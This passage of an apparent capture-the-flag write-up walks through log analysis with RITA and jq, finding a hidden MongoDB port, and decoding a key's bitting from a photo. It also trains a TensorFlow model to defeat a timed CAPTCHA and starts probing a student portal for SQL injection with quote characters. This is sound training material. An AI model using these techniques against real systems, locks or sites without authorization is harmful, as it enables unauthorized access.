</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -Ok https://downloads.elfu.org/elfu-zeeklogs.zip
unzip elfu-zeeklogs.zip
git clone https://github.com/activecm/rita.git
<span style="color:#8be9fd;font-style:italic">cd</span> rita
sudo ./install.sh --disable-bro --disable-mongo
<span style="color:#6272a4"># we start a mongodb container in a new docker-machine,</span>
<span style="color:#6272a4"># then we edit the config file with the mongodb ip address</span>
docker run -p 27017:27017 -d --name some-mongo <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>    -e <span style="color:#8be9fd;font-style:italic">MONGO_INITDB_ROOT_USERNAME</span><span style="color:#ff79c6">=</span>mongoadmin <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>    -e <span style="color:#8be9fd;font-style:italic">MONGO_INITDB_ROOT_PASSWORD</span><span style="color:#ff79c6">=</span>secret <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>    mongo:3.6.18
sudo apt-get install nmap
nmap -p27017 192.168.99.106
<span style="color:#6272a4"># We edit the ConnectionString http://username:password@docker-machine:27017</span>
vi /etc/rita/config.yaml
rita import ../elfu-zeeklogs elfu
rita show-databases
rita show-beacons elfu -H | head -20
</code></pre></td></tr></table>
</div>
</div><p>The first entry with ip address <code>192.168.134.130</code> is having the highest score, which is an indicator of compromission (IoC)</p>
<h2 id="mongo-challenge">Mongo challenge</h2>
<p>Running <code>mongo</code>, we get a hint that mongodb might not be running on the default port
Let&rsquo;s find the process running mongod daemon</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">elf@69f7899a75ea:~$ ps -aef
UID        PID  PPID  C STIME TTY          TIME CMD
elf          <span style="color:#bd93f9">1</span>     <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">0</span> 06:22 pts/0    00:00:00 /bin/bash
mongo        <span style="color:#bd93f9">9</span>     <span style="color:#bd93f9">1</span>  <span style="color:#bd93f9">3</span> 06:22 ?        00:00:01 /usr/bin/mongod --quiet --fork --port <span style="color:#bd93f9">121</span>
</code></pre></td></tr></table>
</div>
</div><p>Mongo is running on port 121 so we try <code>mongo --port 121</code> however it does not work, so we check for pid=9 in /proc</p>
<pre tabindex="0"><code>elf@d94aef4ea2f0:~$ cat /proc/9/cmdline
/usr/bin/mongod--quiet--fork--port12121--bind_ip127.0.0.1--logpath=/tmp/mongo.log
</code></pre><p>Much better, we see port is 12121 with some /tmp/mongo.log :)</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">show databases
use elfu
db<span style="color:#ff79c6">.</span>getCollectionNames()
<span style="color:#6272a4">#There is a collection named &#39;solution&#39;</span>
db<span style="color:#ff79c6">.</span>solution<span style="color:#ff79c6">.</span>count()
<span style="color:#6272a4">#only one object in this collection</span>
db<span style="color:#ff79c6">.</span>solution<span style="color:#ff79c6">.</span>findOne()
<span style="color:#6272a4">#solution is:  &#34;_id&#34; : &#34;You did good! Just run the command between the stars: ** db.loadServerScripts();displaySolution(); **&#34;</span>
db<span style="color:#ff79c6">.</span>loadServerScripts();displaySolution();
</code></pre></td></tr></table>
</div>
</div><p>We get a nice ASCII art Christmas tree with a Congratulation message</p>
<h2 id="wunorse-openslae---zeek-logs-challenge">Wunorse Openslae - Zeek Logs challenge</h2>
<p>We will use jq for this challenge and follow the instructions from SANS website to <a href="https://pen-testing.sans.org/blog/2019/12/03/parsing-zeek-json-logs-with-jq-2">Parsing Zeek JSON Logs with JQ</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#bd93f9">7</span>b<span style="color:#bd93f9">17</span>d<span style="color:#bd93f9">5</span>dab<span style="color:#bd93f9">0</span>:~$ cat conn.log | jq -s &#39;sort_by(.duration) | reverse | .[<span style="color:#bd93f9">0</span>]&#39;
{
  <span style="color:#ff79c6">&#34;ts&#34;</span>: <span style="color:#f1fa8c">&#34;2019-04-18T21:27:45.402479Z&#34;</span>,
  <span style="color:#ff79c6">&#34;uid&#34;</span>: <span style="color:#f1fa8c">&#34;CmYAZn10sInxVD5WWd&#34;</span>,
  <span style="color:#ff79c6">&#34;id.orig_h&#34;</span>: <span style="color:#f1fa8c">&#34;192.168.52.132&#34;</span>,
  <span style="color:#ff79c6">&#34;id.orig_p&#34;</span>: <span style="color:#bd93f9">8</span>,
  <span style="color:#ff79c6">&#34;id.resp_h&#34;</span>: <span style="color:#f1fa8c">&#34;**13.107.21.200**&#34;</span>,
  <span style="color:#ff79c6">&#34;id.resp_p&#34;</span>: <span style="color:#bd93f9">0</span>,
  <span style="color:#ff79c6">&#34;proto&#34;</span>: <span style="color:#f1fa8c">&#34;icmp&#34;</span>,
  <span style="color:#ff79c6">&#34;duration&#34;</span>: <span style="color:#bd93f9">1019365.337758</span>,
  <span style="color:#ff79c6">&#34;orig_bytes&#34;</span>: <span style="color:#bd93f9">30781920</span>,
  <span style="color:#ff79c6">&#34;resp_bytes&#34;</span>: <span style="color:#bd93f9">30382240</span>,
  <span style="color:#ff79c6">&#34;conn_state&#34;</span>: <span style="color:#f1fa8c">&#34;OTH&#34;</span>,
  <span style="color:#ff79c6">&#34;missed_bytes&#34;</span>: <span style="color:#bd93f9">0</span>,
  <span style="color:#ff79c6">&#34;orig_pkts&#34;</span>: <span style="color:#bd93f9">961935</span>,
  <span style="color:#ff79c6">&#34;orig_ip_bytes&#34;</span>: <span style="color:#bd93f9">57716100</span>,
  <span style="color:#ff79c6">&#34;resp_pkts&#34;</span>: <span style="color:#bd93f9">949445</span>,
  <span style="color:#ff79c6">&#34;resp_ip_bytes&#34;</span>: <span style="color:#bd93f9">56966700</span>
}
elf@ba<span style="color:#bd93f9">7</span>b<span style="color:#bd93f9">17</span>d<span style="color:#bd93f9">5</span>dab<span style="color:#bd93f9">0</span>:~$ runtoanswer
[...]
What is the destination IP address with the longes connection duration? ** <span style="color:#bd93f9">13.107</span>.<span style="color:#bd93f9">21.200</span> **
[...]
Congratulations
</code></pre></td></tr></table>
</div>
</div><h2 id="get-access-to-the-steam-tunnels">Get access to the steam tunnels</h2>
<ul>
<li><a href="https://youtu.be/KU6FJnbkeLA">Optical decoding of key bitting</a></li>
<li><a href="https://github.com/deviantollam/decoding">Deviant&rsquo;s Key Decoding templates</a></li>
</ul>
<p>Near the grinder machine we find Krampus who is wearing the key. Looking at the <code>DevTools Network</code> tab,
we can capture the png file that contains the key picture.
Then we use gimp together with guides downloaded from Deviant&rsquo;s github.
Using <code>gimp</code> we decode the following bitting: 12252</p>
<p>I was not accessible to use the machine to produce the key,
but could figure out from source code the url based should looks like <a href="https://key.elfu.org/backend/keys/SC4_preview/12252?.png">https://key.elfu.org/backend/keys/SC4_preview/12252?.png</a></p>
<p>The server always complaining of an invalid bitting length,
I have therefore generated two keys with a zero at the beginning or at end of the code
to retrieve the key from the server with the following url <code>https://key.elfu.org/backend/keys/SC4_preview/122520.png</code></p>
<p>We now have access to the Steam tunnels and we can speak with Krampus who reveal his name and admit having &ldquo;borrowed&rdquo; the two turtle doves.</p>
<p>Objective completed with answer <strong>Krampus Hollyfeld</strong></p>
<h2 id="frido-sleigh-contest-objective-8">Frido Sleigh contest (Objective 8)</h2>
<p>This is about machine learning image recognition with Tensorflow</p>
<p>This challenge is open to elves, not to human &hellip;
so naturally, we have to submit a CAPTEHA which is a CAPTCHA-equivalent technology to prove we are &lsquo;not&rsquo; a human</p>
<p><strong>Loool! I love the creativity of those challenges makers.</strong></p>
<p>Indeed the challenge cannot be done manually by a human on the website
because the CAPTEHA is only visible 5 seconds with too many images to classify.
So the solution is to use instead the API and build an image recognition classifier model
using tensorflow to mimic the speed and efficacy of elves.</p>
<ul>
<li>resources:
<ul>
<li><a href="https://fridosleigh.com/">https://fridosleigh.com/</a></li>
<li><a href="https://downloads.elfu.org/capteha_images.tar.gz">catalog of 12,000 images</a></li>
<li><a href="https://downloads.elfu.org/capteha_api.py">API interface</a></li>
<li><a href="https://youtu.be/jmVPLwjm_zs">Image recognition Youtube</a> Machine Learning Use Cases for Cybersecurity from <a href="https://twitter.com/christojdav">Chris Davis</a></li>
<li><a href="https://github.com/chrisjd20/img_rec_tf_ml_demo">git hub</a> Image Recognition Using TensorFlow Machine Learning Demo to recognize Apples from Bananas</li>
</ul>
</li>
</ul>
<p>We download and untar a bank of 12,000 images of Candy Canes, Christmas Trees, Ornaments, Presents, Santa Hats, Stockings.
I believe we have to build a model to by-pass a captcha.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkdir capteha_images
<span style="color:#8be9fd;font-style:italic">cd</span> capteha_images
curl -Ok https://downloads.elfu.org/capteha_images.tar.gz
tar -xvzf capteha_images.tar.gz
</code></pre></td></tr></table>
</div>
</div><p>We also download the capteha_api.py which contains source code to connect to the server without doing it manually on the website &hellip;
however some code is missing and the python file provide a big hint: <code>MISSING IMAGE PROCESSING AND ML IMAGE PREDICTION CODE GOES HERE</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># Tensorflow==1.15 is not available for python 3.8 so we downgrade to python3.7</span>
<span style="color:#6272a4"># https://pypi.org/project/tensorflow/1.15.0/#files</span>
sudo apt-get install python3.7
virtualenv -p /usr/bin/python3.7 venv
<span style="color:#8be9fd;font-style:italic">source</span> venv/bin/activate
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade setuptools
python3 -m pip install --upgrade <span style="color:#8be9fd;font-style:italic">tensorflow</span><span style="color:#ff79c6">==</span>1.15
python3 -m pip install --upgrade tensorflow_hub
</code></pre></td></tr></table>
</div>
</div><p>We can then start to train our dataset. Assuming our training data is in the folder &lsquo;capteha_images&rsquo;,
we have to copy subfolders named according to each class of image (Candy Canes, Christmas Trees, Ornaments, Presents, Santa Hats, Stockings).
This is the way our Tensorflow script identifies the label of the images during training phase.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#8be9fd;font-style:italic">time</span> python3 retrain.py --image_dir ./capteha_images/
</code></pre></td></tr></table>
</div>
</div><p>It&rsquo;s very long (65 min for below 12000 images) &hellip;
so better go supermarket and buy 1 kg yoghourt or move to another challenge or write-up or audit the code while this is training ;)
Once trained, a graph model is created in a form of a file.
We want to test the accuracy of our model with the below command</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./predict_images_using_trained_model.py
</code></pre></td></tr></table>
</div>
</div><p>Looking at the devtools, when clicking the capteha, an api request call to /api/capteha/request is being done to retrieve the images
in a form of a json array (called &lsquo;images&rsquo;) of K-V pairs (uuid; base64).</p>
<p>uuid is the unique id for the image and base64 is the image representation in base64)</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#39;{&#34;images&#34;:[{&#34;base64&#34;:&#34;iVBORw0KGgoAAAANSUhEUgAAAH4AA[...]AAAElFTkSuQmCC&#34;,&#34;uuid&#34;:&#34;bb4f0837-e584-11e9-97c1-309c23aaf0ac&#34;},{&#34;base64&#34;:&#34;iVBORw0KGgoAAAANSUhEUgAAAIIAAACCCAY[...]AABJRU5ErkJggg==&#34;,&#34;uuid&#34;:&#34;bb966602-e584-11e9-97c1-309c23aaf0ac&#34;}]}&#39;</span> | jq
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
  <span style="color:#ff79c6">&#34;images&#34;</span>: [
    {
      <span style="color:#ff79c6">&#34;base64&#34;</span>: <span style="color:#f1fa8c">&#34;iVBORw0KGgoAAAANSUhEUgAAAH4AA[...]AAAElFTkSuQmCC&#34;</span>,
      <span style="color:#ff79c6">&#34;uuid&#34;</span>: <span style="color:#f1fa8c">&#34;bb4f0837-e584-11e9-97c1-309c23aaf0ac&#34;</span>
    },
    {
      <span style="color:#ff79c6">&#34;base64&#34;</span>: <span style="color:#f1fa8c">&#34;iVBORw0KGgoAAAANSUhEUgAAAIIAAACCCAY[...]AABJRU5ErkJggg==&#34;</span>,
      <span style="color:#ff79c6">&#34;uuid&#34;</span>: <span style="color:#f1fa8c">&#34;bb966602-e584-11e9-97c1-309c23aaf0ac&#34;</span>
    }
  ]
}
</code></pre></td></tr></table>
</div>
</div><p>The rest of the capteha response payload is unfortunately truncated by devtools,
so to get the full payload we will probably need something like Burp-suite or custom python code.
Never-mind, challenge developers had the kindness to develop for us the capteha-api.py
which contains the code we are interesting to analyze the capteha requests.
I am actually running this code to observe the response payload in detail.
I modify the python script to use the ML predictions, and execute:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">TODO: put code here
</code></pre></td></tr></table>
</div>
</div><p>No luck, my docker machine is not very powerful and it takes 35 seconds to execute and predict very accurately all images.</p>
<p>I need to find a way to do it more effectively and below the 5 seconds time out!
maybe the image bank is limited and we can exhaust the bank by keeping a hash of all uuid we have previously figure-out the class?</p>
<p>Actually, only the first part of the uuid needs to be used as a key for our dictionary.</p>
<p>Well, after dozen runs and about 10k images hash generated,
My cache (a simple python dictionary) has never been hit :( !!!</p>
<p>Either the image bank is huge or there is a slight and unexpensive random transformation
to prevent me to build a rainbow table of K-V pairs (K=hash of the base64 image, V=image class guessed by Tensorflow).</p>
<p>So I try to move on another technique that consists to use the GPU instead of the CPU.
However again, I am not lucky, my laptop is using an <code>Intel HD graphics</code>
which is in my understanding a virtual GPU embedded in the CPU &hellip; with terrible performance &hellip;</p>
<p>so lessons learnt is you have to be a gamer when you want to do ML.</p>
<p>Actually this statement is not true, someone in the forum suggested to move on <code>Google Colab</code> which allows to use TensorFlow with GPU for free!
It is a completely new journey I want to try.</p>
<p>My source code needed few adjustements and I built the following two python notebook :</p>
<ul>
<li><a href="./retrain.ipynb">retrain.ipynb</a></li>
<li><a href="./predict.ipynb">predict.ipynb</a></li>
</ul>
<p>Google Tensorflow with GPU enabled are abolutely fantastic as it could classify all 100 images in a blink.
Then the challenge answer is received on my email address.</p>
<h2 id="student-portal">Student Portal</h2>
<p>resources:</p>
<ul>
<li><a href="https://studentportal.elfu.org/">Student portal</a></li>
<li><a href="https://github.com/sqlmapproject/sqlmap/wiki/Techniques">Sqlmap</a></li>
<li><a href="https://pen-testing.sans.org/blog/2017/10/13/sqlmap-tamper-scripts-for-the-win">sqlmap tamper scripts</a></li>
</ul>
<p>Hints: Pepper Mint informed us that a SQLI attack may work.
I first click on &lsquo;apply now&rsquo; and fill in the form with a quote caracter in the firstname to get the below error message:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">Error: <span style="color:#ff79c6">INSERT</span> <span style="color:#ff79c6">INTO</span> applications (name, elfmail, program, phone, whyme, essay, status) <span style="color:#ff79c6">VALUES</span> (<span style="color:#f1fa8c">&#39;aaaaaa&#39;</span>, <span style="color:#f1fa8c">&#39;a@a.com&#39;</span>, <span style="color:#f1fa8c">&#39;a&#39;</span>, <span style="color:#f1fa8c">&#39;55555555&#39;</span>, <span style="color:#f1fa8c">&#39;w&#39;</span>, <span style="color:#f1fa8c">&#39;qwertyuiop&#39;</span>, <span style="color:#f1fa8c">&#39;pending&#39;</span>)
Duplicate entry <span style="color:#f1fa8c">&#39;a@a.com&#39;</span> <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">key</span> <span style="color:#f1fa8c">&#39;elfmail&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>A website that shows such a log is terrible as it gives way to much information on the underlying database backent and model.</p>
<p>Obviously someone registered before me with &lsquo;<a href="mailto:a@a.com">a@a.com</a>&rsquo; so I&rsquo;ll just check the application status with this email address.
Instead of submitting the email address alone, I have added a simple quote <code>'a@a.com</code> and an error message is showing:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
